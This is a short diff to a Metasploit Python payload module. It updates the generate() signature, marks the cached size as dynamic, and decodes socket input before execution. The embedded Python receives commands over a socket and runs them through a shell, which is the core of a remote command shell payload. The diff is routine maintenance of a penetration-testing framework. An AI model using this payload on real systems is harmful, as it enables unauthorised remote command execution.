@@ -6,7 +6,7 @@
 
 module MetasploitModule
 
-  CachedSize = 453
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -34,7 +34,7 @@ module MetasploitModule
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     super + command_string
   end
 
@@ -52,7 +52,7 @@ module MetasploitModule
       	d=so.recv(1024)
       	if len(d)==0:
       		break
-      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
+      	p=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
       	o=p.stdout.read()+p.stderr.read()
     PYTHON
 
